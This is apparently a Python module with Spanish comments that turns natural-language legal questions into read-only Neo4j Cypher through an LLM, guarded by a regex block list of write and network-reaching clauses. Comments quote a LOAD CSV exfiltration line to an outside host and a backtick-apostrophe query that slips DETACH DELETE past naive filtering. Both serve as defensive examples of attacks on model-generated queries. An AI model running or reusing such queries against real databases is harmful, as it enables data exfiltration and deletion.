"""Motor Text-to-Cypher dinámico: traduce una pregunta en lenguaje natural a una query
Cypher de solo lectura contra el esquema del grafo. Se usa cuando el contexto vectorial
más remisiones no alcanza para responder (ver el gate de suficiencia en api/recuperacion.py).
"""
import re

from utils.extractor_base import RELACIONES_PERMITIDAS
from utils.rag.grafo import etiquetas_similares
from utils.rag.llm_io import strip_markdown


class MotorCypherDinamico:
    # Cláusulas que no pueden aparecer en la query que escribe el modelo. Son dos grupos, con
    # motivos distintos, y la diferencia importa:
    #
    #   ESCRITURA (DELETE, DETACH, REMOVE, SET, MERGE, CREATE, INSERT, DROP)
    #     El servidor ya las rechaza dentro de execute_read(). Verificado contra la base:
    #     `Neo.ClientError.Statement.AccessMode: Writing in read access mode not allowed`.
    #     Acá son redundancia deliberada — fallan antes y con un mensaje que dice qué pasó.
    #     INSERT es el alias GQL de CREATE: sintaxis válida en 5.27, y no estaba contemplado.
    #
    #   LECTURA PELIGROSA (CALL, LOAD, USE, SHOW)
    #     Éstas NO las cubre el modo lectura, porque no escriben. Son las que hacen falta:
    #       CALL → procedimientos. apoc.load.json contacta una URL arbitraria y
    #              apoc.cypher.runFirstColumn ejecuta Cypher escondido en un string.
    #       LOAD → `LOAD CSV FROM 'http://ajeno/' + a.texto AS r` exfiltra el grafo a un
    #              servidor externo sin escribir un solo nodo.
    #       USE  → salta a otra base del mismo DBMS, fuera del alcance previsto.
    #       SHOW → enumera índices, constraints y usuarios.
    _CLAUSULAS_PROHIBIDAS = {"DELETE", "DETACH", "REMOVE", "SET", "MERGE", "CREATE", "INSERT",
                             "DROP", "CALL", "LOAD", "USE", "SHOW"}
    _PATRON_PROHIBIDO = re.compile(
        r"\b(" + "|".join(sorted(_CLAUSULAS_PROHIBIDAS)) + r")\b", re.IGNORECASE
    )

    # Tramos que NO son código ejecutable: identificadores entre backticks, comentarios
    # (// hasta fin de línea, y /* */) y literales de texto ('...' y "...").
    # Se borran ANTES de buscar cláusulas prohibidas, por dos motivos opuestos entre sí:
    #
    # 1. FALSOS POSITIVOS — mataban queries válidas en silencio. Los dos casos son reales:
    #      - Medido: el modelo escribió `// Step 3: Combine all articles, remove duplicates` y
    #        la consulta entera se descartó por la palabra "remove" de un COMENTARIO.
    #      - En un corpus legal, `toLower(art.texto) CONTAINS 'set de documentos'` dispara SET.
    #    El costo de un falso positivo es alto y mudo: `consultar()` devuelve [], que es
    #    indistinguible de "no hay resultados".
    #
    # 2. EVASIÓN — por esto los backticks son obligatorios acá, no cosmética. Un apóstrofo
    #    adentro de un identificador entre backticks abre un literal falso que se traga el
    #    código que viene después:
    #        MATCH (n:Articulo) WHERE n.`x'y` IS NULL DETACH DELETE n WITH 1 AS z RETURN 'z'
    #    Borrando de la primera comilla a la última, el DETACH DELETE desaparecía del texto
    #    inspeccionado y la query pasaba el filtro. Verificado con EXPLAIN contra el servidor:
    #    es sintaxis válida. Neutralizando el backtick primero, el DELETE queda a la vista.
    #
    # El orden de las alternativas no decide nada —el motor escanea de izquierda a derecha y
    # gana la que empieza antes—, pero el backtick va primero porque es el caso que se defiende.
    _PATRON_INERTE = re.compile(
        r"`[^`]*`|//[^\n]*|/\*.*?\*/|'(?:[^'\\]|\\.)*'|\"(?:[^\"\\]|\\.)*\"", re.DOTALL
    )

    def __init__(self, driver, llm_model, embeddings):
        """`embeddings` se usa para recortar el esquema por pregunta (ver `_etiquetas_para`).

        Antes recibía la lista completa de las 566 etiquetas de ontología y la ingresaba en el
        prompt una sola vez. Medido, esa lista era el **75% del prompt** —11.390 de 15.078
        caracteres, unos 2.847 de 3.769 tokens— y se pagaba entera en cada consulta al grafo.
        """
        self.driver = driver
        self.llm = llm_model
        self.embeddings = embeddings

        relaciones_fmt = "\n  ".join(RELACIONES_PERMITIDAS)

        # El esquema fijo, sin las etiquetas: esas se resuelven por pregunta.
        self._esquema = f"""
NODOS Y PROPIEDADES REALES:
  (:Norma {{id, numero, titulo, tipo, rama, jurisdiccion, vigente}})
    — tipo: "Ley" | "Codigo" | "Decreto" | "ResolucionGeneral" | "Resolución" |
            "DisposicionTecnicoRegistral" | "InstruccionDeTrabajo"
    — rama: LISTA de strings, filtrá con IN (ej: 'registral' IN norma.rama). Valores:
            registral | societario | civil | penal | financiero | notarial | tributario |
            inversiones | comercial | datos_personales | asociaciones_civiles
    — jurisdiccion: "Nacional" | "Ciudad Autónoma de Buenos Aires"
    — titulo puede ser NULL: usá coalesce(norma.titulo, norma.id).
    — Ejemplos de id: "Ley_19550" | "CCyCN" | "Decreto_2080_1980" | "RG_15_2024" | "DTR_5_2019"

  (:Articulo {{id, numero, texto, ubicacion, vigente, modificado}})
    — El id NO tiene un formato único: "Art_163_Ley_19550", "Art_1_CCyCN",
      "Art_105_Decreto_2080_1980", "Art_1_DTR_5_2019", "Art_3_RG_2139_2006".
      NUNCA lo parsees ni lo construyas: llegá al artículo por (:Norma)-[:CONTIENE]->(:Articulo).
    — vigente = false ⇒ artículo derogado: no debe usarse como derecho vigente.

  (:<Etiqueta>   {{id: "NOMBRE_EN_MAYUSCULAS_CON_GUIONES"}})
    — La propiedad de búsqueda es SIEMPRE "id", nunca "nombre".
    — Las etiquetas disponibles para ESTA pregunta van más abajo.

RELACIONES:
  (:Norma)-[:CONTIENE]->(:Articulo)
  (:Norma)-[:APLICA_SUPLETORIAMENTE]->(:Norma)   // supletoriedad entre leyes, NO entre entidades
  (:Articulo o :Entidad)-[:TIPO]->(: Articulo o :Entidad)
    Tipos disponibles:
  {relaciones_fmt}
"""

        # EL EJEMPLO SE CORRIGIÓ PORQUE EL ANTERIOR NO FUNCIONABA.
        #
        # La versión previa arrancaba con `OPTIONAL MATCH (art_directo)...` y seguía con un
        # `MATCH (norma_origen:Norma)-[:CONTIENE]->(art_directo)` obligatorio. Eso anula el
        # OPTIONAL: si `art_directo` viene null, el MATCH obligatorio no encuentra nada y mata
        # la fila entera. Corrida tal cual contra el grafo, **devolvía 0 filas** — y no por
        # falta de datos: hay 32 artículos vigentes que mencionan "debenture" y 151 relaciones
        # entre artículos y la entidad SAS.
        #
        # Importa más de lo que parece, porque un ejemplo few-shot no se lee: se copia. Medido
        # sobre cinco preguntas que no tienen nada que ver con supletoriedad, 2 de 5 replicaron
        # esa estructura rota. Le estábamos enseñando al modelo, en cada llamada, una consulta
        # que no anda.
        #
        # La versión de abajo está verificada contra la base: devuelve 5 artículos.
        # Enseña además tres cosas que el prompt pide y el ejemplo viejo no mostraba: llegar al
        # artículo desde la Norma, filtrar por vigencia, y expresar la supletoriedad como una
        # alternativa dentro del WHERE en vez de como un segundo MATCH encadenado.
        self._ejemplo = """
EJEMPLO — supletoriedad (la Ley 27349 aplica supletoriamente la Ley 19550):
Pregunta: "¿Puede una SAS emitir debentures?"
Cypher:
MATCH (norma:Norma)-[:CONTIENE]->(art:Articulo)
WHERE art.vigente = true AND toLower(art.texto) CONTAINS 'debenture'
  AND (
    (art)-[:REGULA|AUTORIZA|PROHIBE|DEFINE]-(:SociedadPorAccionesSimplificada)
    OR (:Norma {id: "Ley_27349"})-[:APLICA_SUPLETORIAMENTE]->(norma)
  )
RETURN DISTINCT art.id AS id, art.numero AS numero, art.texto AS texto
LIMIT 5
"""

    def _etiquetas_para(self, pregunta: str) -> list[str]:
        """Las etiquetas de entidad relevantes para esta pregunta, no las 566.

        Si falla —la API de embeddings caída, Neo4j sin responder— devuelve una lista vacía y
        el prompt se lo dice al modelo, que igual puede resolver buscando por el texto del
        artículo. Es peor que tener las etiquetas, pero mucho mejor que cortar la consulta.
        """
        try:
            return etiquetas_similares(self.driver, self.embeddings.embed_query(pregunta))
        except Exception as e:
            print(f"  [Grafo] No se pudieron recuperar las etiquetas relevantes: {e}")
            return []

    def _generar_prompt(self, pregunta: str) -> str:
        etiquetas = self._etiquetas_para(pregunta)
        bloque_etiquetas = (
            "ETIQUETAS DE ENTIDAD RELEVANTES PARA ESTA PREGUNTA:\n  "
            + " | ".join(etiquetas)
            + "\n  (Es un subconjunto elegido por cercanía semántica, NO todas las del grafo.)"
        ) if etiquetas else (
            "ETIQUETAS DE ENTIDAD: no se pudieron recuperar. Resolvé buscando por el texto\n"
            "  del artículo con CONTAINS, sin usar ninguna etiqueta de entidad."
        )

        return f"""Eres un experto en Neo4j y derecho argentino. Generá una query Cypher de SOLO LECTURA.

ESQUEMA DEL GRAFO:
{self._esquema}

{bloque_etiquetas}

{self._ejemplo}

REGLAS ESTRICTAS:
1. Devolvé ÚNICAMENTE el código Cypher. Sin texto adicional.
2. NO inventes etiquetas ni propiedades. Usá SOLO las etiquetas de la lista de arriba,
   copiadas tal cual. Si ninguna encaja con la pregunta, NO inventes una que "debería"
   existir: buscá por el texto del artículo con toLower(art.texto) CONTAINS '...'.
   Medido: sin esta regla el modelo escribía (:TractoAbreviado) cuando la etiqueta real es
   TractoSucesivo, y (:Fusion), que no existe. Neo4j no falla con una etiqueta inexistente
   —devuelve cero filas en silencio— así que el error es invisible.
3. Para buscar entidades usá su etiqueta específica y filtrá por "id" con toLower() + CONTAINS.
3.bis. Un patrón dentro de WHERE es una condición booleana y **no puede introducir variables
   nuevas**. Poné la etiqueta o el id adentro del patrón, no en una condición aparte:
       BIEN : WHERE (art)-[:REGULA]->(:Hipoteca)
       BIEN : WHERE (art)-[:REGULA]->({{id: 'HIPOTECA'}})
       MAL  : WHERE (art)-[:REGULA]->(e) AND e.id = 'HIPOTECA'
   Ese "MAL" falla con `PatternExpressions are not allowed to introduce new variables`.
   Si necesitás datos de la entidad, sacala del WHERE y ponela en el MATCH.
4. Para supletoriedad traversá a nivel de NORMA: (norma)-[:APLICA_SUPLETORIAMENTE]->(norma_sup)-[:CONTIENE]->(art).
5. Retorná exactamente estas columnas: id, numero, texto.
6. LIMIT 5.
7. Devolvé SOLO artículos vigentes: agregá `AND art.vigente = true` a cada match de artículo.
8. Si la pregunta acota una rama o una jurisdicción, filtrá por la Norma que lo contiene:
   MATCH (n:Norma)-[:CONTIENE]->(art)
   WHERE 'registral' IN n.rama AND n.jurisdiccion = 'Ciudad Autónoma de Buenos Aires'

PREGUNTA:
{pregunta}
Cypher:"""

    @staticmethod
    def _postprocesar(cypher: str) -> str:
        """Corrige patrones Cypher inválidos que el LLM genera por su training data."""
        # `UNWIND x AS y \n WHERE` es inválido; la forma correcta es `UNWIND x AS y \n WITH y WHERE`.
        cypher = re.sub(
            r'(UNWIND\s+\S+\s+AS\s+(\w+))(\s*\n\s*)WHERE',
            lambda m: f"{m.group(1)}{m.group(3)}WITH {m.group(2)} WHERE",
            cypher,
            flags=re.IGNORECASE,
        )
        return cypher

    @staticmethod
    def _ejecutar(tx, cypher: str) -> list[dict]:
        """Corre la query y **avisa de las advertencias del servidor** en vez de tirarlas.

        Neo4j no falla cuando una query menciona una etiqueta que no existe: devuelve cero
        filas y una notificación. Sin esto, ese caso es indistinguible de "no hay resultados",
        que es la peor forma de fallar — el sistema sigue como si nada con menos contexto.

        Medido: el modelo escribió `(:TractoAbreviado)` cuando la etiqueta real es
        `TractoSucesivo`. La consulta ejecutó sin error, devolvió nada, y la única señal fue
        esta advertencia que nadie leía.
        """
        resultado = tx.run(cypher)
        filas = resultado.data()
        for aviso in resultado.consume().summary_notifications:
            print(f"  [Grafo] Advertencia de Neo4j ({aviso.severity_level.name}): {aviso.description}")
        return filas


    def consultar(self, pregunta: str) -> list[dict]:
        print("  [Grafo] Generando Cypher dinámicamente...")
        try:
            respuesta_llm = self.llm.invoke(self._generar_prompt(pregunta))
            cypher = strip_markdown(str(respuesta_llm.content))
            cypher = self._postprocesar(cypher)

            # Se busca sobre el código sin backticks, comentarios ni literales: ver
            # _PATRON_INERTE. Lo que se ejecuta es el `cypher` ORIGINAL — acá solo se inspecciona.
            codigo = self._PATRON_INERTE.sub(" ", cypher)
            bloqueadas = {m.upper() for m in self._PATRON_PROHIBIDO.findall(codigo)}
            if bloqueadas:
                print(f"  [Grafo] Cypher rechazado: cláusulas no permitidas detectadas: {bloqueadas}")
                return []

            print(f"  [Grafo] Cypher:\n{'-'*30}\n{cypher}\n{'-'*30}")

            # Segunda barrera, y la que de verdad garantiza que no se altere el grafo: el
            # servidor rechaza toda escritura dentro de una transacción de lectura. No es
            # solo routing de cluster — verificado contra la base de este proyecto, un CREATE
            # acá levanta Neo.ClientError.Statement.AccessMode antes de tocar nada.
            with self.driver.session() as session:
                records = session.execute_read(self._ejecutar, cypher)
                return [r for r in records if r.get("id") and r.get("texto")]

        except Exception as e:
            print(f"  [Grafo] Error: {e}")
            return []
